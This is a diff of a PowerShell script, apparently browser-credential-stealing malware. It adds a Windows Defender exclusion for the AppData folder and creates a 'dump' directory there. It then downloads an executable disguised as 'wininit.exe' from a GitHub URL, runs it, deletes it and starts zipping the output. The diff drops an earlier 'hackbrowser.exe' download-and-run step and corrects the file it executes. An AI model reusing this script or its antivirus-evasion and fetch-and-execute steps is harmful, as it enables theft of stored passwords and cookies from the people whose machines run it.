@@ -7,12 +7,8 @@ Add-MpPreference -ExclusionPath "$env:appdata"
 mkdir "$env:appdata\dump"
 Set-Location "$env:appdata\dump"
 #Downloading and executing hackbrowser.exe
-Invoke-WebRequest -Uri "https://github.com/user337666/brow666/raw/main/browser.exe" -OutFile "$env:appdata\dump\hb.exe"
-./hb.exe
-Start-Sleep -Seconds 6
-Remove-Item -Path "$env:appdata\dump\hb.exe" -Force
 Invoke-WebRequest -Uri "https://github.com/user337666/brow666/raw/main/wininit.exe" -OutFile "$env:appdata\dump\wn.exe"
-./hb.exe
+./wn.exe
 Start-Sleep -Seconds 6
 Remove-Item -Path "$env:appdata\dump\wn.exe" -Force
 #Creating A Zip Archive
